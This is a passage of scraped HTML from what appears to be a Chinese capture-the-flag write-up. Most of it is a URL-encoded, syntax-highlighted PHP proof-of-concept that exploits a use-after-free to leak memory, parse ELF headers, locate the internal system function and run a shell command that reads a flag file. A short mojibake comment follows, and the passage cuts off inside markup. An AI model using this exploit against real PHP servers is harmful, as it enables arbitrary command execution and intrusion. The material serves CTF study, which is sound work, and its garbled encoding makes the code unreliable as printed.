class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">parse_elf</span>(<span class="params">%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phoff</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phentsize</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x36%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">e_phnum</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>e_phnum%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">header</span>%20%3<span class="title">D</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span class="title">e_phoff</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%20%24<span class="title">e_phentsize</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_type</span>%20%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_flags</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">204</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_vaddr</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">p_memsz</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>header%<span class="number">2</span>C%<span class="number">200</span>x28</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">206</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">e_type</span>%20%3<span class="title">D</span>%3<span class="title">D</span>%202%20%3<span class="title">F</span>%20%24<span class="title">p_vaddr</span>%20%3<span class="title">A</span>%20%24<span class="title">base</span>%20%2<span class="title">B</span>%20%24<span class="title">p_vaddr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">205</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">text_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!%<span class="number">24</span>data_addr%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>text_size%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>data_size</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%5<span class="title">B</span>%24<span class="title">data_addr</span>%2<span class="title">C</span>%20%24<span class="title">text_size</span>%2<span class="title">C</span>%20%24<span class="title">data_size</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_basic_funcs</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">list</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>text_size%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>data_size</span>)%20%3<span class="title">D</span>%20%24<span class="title">elf</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_size%<span class="number">20</span>%<span class="number">2</span>F%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x746e6174736e6f63</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">204</span></span>)%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x786568326e6962</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">data_addr</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_binary_base</span>(<span class="params">%<span class="number">24</span>binary_leak</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">base</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">start</span>%20%3<span class="title">D</span>%20%24<span class="title">binary_leak</span>%20%26%200<span class="title">xfffffffffffff000</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x1000%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">start</span>%20-%200<span class="title">x1000</span>%20*%20%24<span class="title">i</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">207</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x10102464c457f</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">addr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_system</span>(<span class="params">%<span class="number">24</span>basic_funcs</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">basic_funcs</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">do</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_entry</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_name</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>f_name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x6d6574737973</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%2<span class="title">B</span>%3<span class="title">D</span>%200<span class="title">x20</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">while</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">trigger_uaf</span>(<span class="params">%<span class="number">24</span>arg</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">arg</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Vuln</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>-%3<span class="title">Ea</span>%20%3<span class="title">D</span>%20%24<span class="title">arg</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">stristr(<span class="params">PHP_OS%<span class="number">2</span>C%<span class="number">20</span><span class="string">&#x27;WIN&#x27;</span></span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params"><span class="string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">n_alloc</span>%20%3<span class="title">D</span>%2010%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%24<span class="title">contiguous</span>%20%3<span class="title">D</span>%20%5<span class="title">B</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n_alloc%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">contiguous</span>%5<span class="title">B</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">trigger_uaf</span>(<span class="params"><span class="string">&#x27;x&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc</span>%20%3<span class="title">D</span>%20%24<span class="title">backtrace</span>%5<span class="title">B1</span>%5<span class="title">D</span>%5<span class="title">B</span>&#x27;<span class="title">args</span>&#x27;%5<span class="title">D</span>%5<span class="title">B0</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>-%3<span class="title">Eb</span>%20%3<span class="title">D</span>%20<span class="title">function</span>%20(<span class="params">%<span class="number">24</span>x</span>)%20%7<span class="title">B</span>%20%7<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">2079</span>%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>UAF%<span class="number">20</span>failed%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_handlers</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">php_heap</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x58</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">php_heap</span>%20-%200<span class="title">xc8</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x60%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x70%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x60</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x18%<span class="number">2</span>C%<span class="number">200</span>xa</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_obj</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">binary_leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>closure_handlers%<span class="number">2</span>C%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_binary_base(<span class="params">%<span class="number">24</span>binary_leak</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>parse%<span class="number">20</span>ELF%<span class="number">20</span>header%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>basic_funcs%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_basic_funcs(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>get%<span class="number">20</span>zif_system%<span class="number">20</span>address%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">fake_obj_offset</span>%20%3<span class="title">D</span>%200<span class="title">xd0</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x110%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>C%<span class="number">20</span>leak(<span class="params">%<span class="number">24</span>closure_obj%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">201</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>zif_system</span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Eb</span>)(<span class="params">%<span class="number">24</span>cmd</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">exit</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">Actfshow</span>(<span class="params">%<span class="number">22</span>cat%<span class="number">20</span>%<span class="number">2</span>Fflag0.txt%<span class="number">22</span></span>)%3<span class="title">Bob_end_flush</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%3<span class="title">F</span>%3<span class="title">E</span></span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ªpayloadæŠŠæ–¹æ³•å½“å‡½æ•°äº†ï¼Œä½†æ˜¯æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 